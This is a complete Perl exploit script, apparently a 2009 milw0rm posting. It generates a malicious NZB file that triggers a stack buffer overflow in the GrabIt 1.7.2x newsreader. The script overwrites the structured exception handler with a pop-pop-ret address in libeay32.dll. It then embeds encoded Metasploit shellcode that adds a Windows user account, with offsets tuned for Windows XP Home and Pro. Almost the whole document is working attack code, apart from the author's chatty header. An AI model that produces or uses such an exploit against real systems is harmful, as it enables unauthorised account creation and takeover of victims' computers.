#!/usr/bin/perl
# theroadoutsidemyhouseispavedwithgoodintentions.pl
# AKA
# GrabIt 1.7.2x NZB DTD Reference Buffer Overflow Exploit
# BY
# Jeremy Brown [0xjbrown41@gmail.com] 05.07.2009
# ***********************************************************************************************************
# It seems I couldn't gather my resources quickly enough before the first exploit came out.. and it came as
# no surprise that it was a disappointment like so many others out there. I personally used to use this
# newsgroup program all the time, usenet is a nice service :) GrabIt is great-- Kudos to Shemes for sure.
# ***********************************************************************************************************
# After reading the advisory then debugging, I found the bug is a fairly standard hit and run stack overflow..
# we can overwrite SEH like a dream, so sadly this one may turn into malware rather quickly.. uh oh. Advice
# at the moment shall be.. update GrabIt quickly, like right now!
# ***********************************************************************************************************
#                libeay32.dll
#
# 1001A384   5B               POP EBX
# 1001A385   5D               POP EBP
# 1001A386   C3               RETN
#
# This exploit has been successfully tested in the following environments...
#
# Windows XP Home SP3 -> GrabIt 1.7.2b3 (GrabIt172b3.exe)
#                        GrabIt 1.7.2b2 (GrabIt172b2.exe)
#                        GrabIt 1.7.2b  (GrabIt172b.exe)
#
# Windows XP Pro SP3  -> GrabIt 1.7.2b3 (GrabIt172b3.exe)
#                        GrabIt 1.7.2b2 (GrabIt172b2.exe)
#                        GrabIt 1.7.2b  (GrabIt172b.exe)
#
# ***********************************************************************************************************
# BRONBRONGOTMVP: The Houston and LA series is heating up! I got the Lakers in 6 :D
# ***********************************************************************************************************
# theroadoutsidemyhouseispavedwithgoodintentions.pl

$nextsehh = 0x909006EB; # jmp 6
$sehh     = 0x1001A384; # pop, pop, ret @ libeay32.dll

# win32_adduser -  PASS=face EXITFUNC=process USER=smiley Size=236 Encoder=PexFnstenvSub http://metasploit.com
$sc = "\x31\xc9\x83\xe9\xcb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe8".
      "\x5b\xc1\xe6\x83\xeb\xfc\xe2\xf4\x14\xb3\x85\xe6\xe8\x5b\x4a\xa3".
      "\xd4\xd0\xbd\xe3\x90\x5a\x2e\x6d\xa7\x43\x4a\xb9\xc8\x5a\x2a\xaf".
      "\x63\x6f\x4a\xe7\x06\x6a\x01\x7f\x44\xdf\x01\x92\xef\x9a\x0b\xeb".
      "\xe9\x99\x2a\x12\xd3\x0f\xe5\xe2\x9d\xbe\x4a\xb9\xcc\x5a\x2a\x80".
      "\x63\x57\x8a\x6d\xb7\x47\xc0\x0d\x63\x47\x4a\xe7\x03\xd2\x9d\xc2".
      "\xec\x98\xf0\x26\x8c\xd0\x81\xd6\x6d\x9b\xb9\xea\x63\x1b\xcd\x6d".
      "\x98\x47\x6c\x6d\x80\x53\x2a\xef\x63\xdb\x71\xe6\xe8\x5b\x4a\x8e".
      "\xd4\x04\xf0\x10\x88\x0d\x48\x1e\x6b\x9b\xba\xb6\x80\x25\x19\x04".
      "\x9b\x33\x59\x18\x62\x55\x96\x19\x0f\x38\xac\x82\xc6\x3e\xb9\x83".
      "\xc8\x74\xa2\xc6\x86\x3e\xb5\xc6\x9d\x28\xa4\x94\xc8\x28\xac\x8f".
      "\x84\x3e\xb8\xc6\x8e\x3a\xa2\x83\xc8\x74\x80\xa2\xac\x7b\xe7\xc0".
      "\xc8\x35\xa4\x92\xc8\x37\xae\x85\x89\x37\xa6\x94\x87\x2e\xb1\xc6".
      "\xa9\x3f\xac\x8f\x86\x32\xb2\x92\x9a\x3a\xb5\x89\x9a\x28\xe1\x95".
      "\x85\x32\xad\x83\x91\x7b\xee\xa7\xac\x1f\xc1\xe6";

$filename = $ARGV[0];
$target   = $ARGV[1];

     print "\n            GrabIt 1.7.2x NZB DTD Reference Buffer Overflow Exploit";
     print "\n                     Jeremy Brown [0xjbrown41\@gmail.com]\n";

if((!defined($filename) || !defined($target)))
{

     print "\nUsage: $0 pwn.nzb <target>\n";
     print "\nTargets: [1] Windows XP Home\n         [2] Windows XP Pro\n\n";
     exit;

}

$nextseh = pack('l', $nextsehh);
$seh     = pack('l', $sehh);
$nop     = "\x90";

$nzb1 = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n";
$nzb2 = "<!DOCTYPE nzb PUBLIC \"YOUKNOWTHEWORDS,SOSINGALONGFORMEBABY\" \"";

# Lets get nice and comfortable
if($target == "1") { $payload = $nzb1 . $nzb2 . $nop x 248 . $nextseh . $seh . $nop x 32 . $sc . "\">"; }
if($target == "2") { $payload = $nzb1 . $nzb2 . $nop x 251 . $nextseh . $seh . $nop x 32 . $sc . "\">"; }

     open(FILE, ">", $filename) or die("\nError: Can't write to $filename! Exploit stopped");
     print FILE $payload;
     close(FILE);

     print "\nExploit NZB \"$filename\" successfully created.\n\n";
     exit;

# milw0rm.com [2009-05-07]
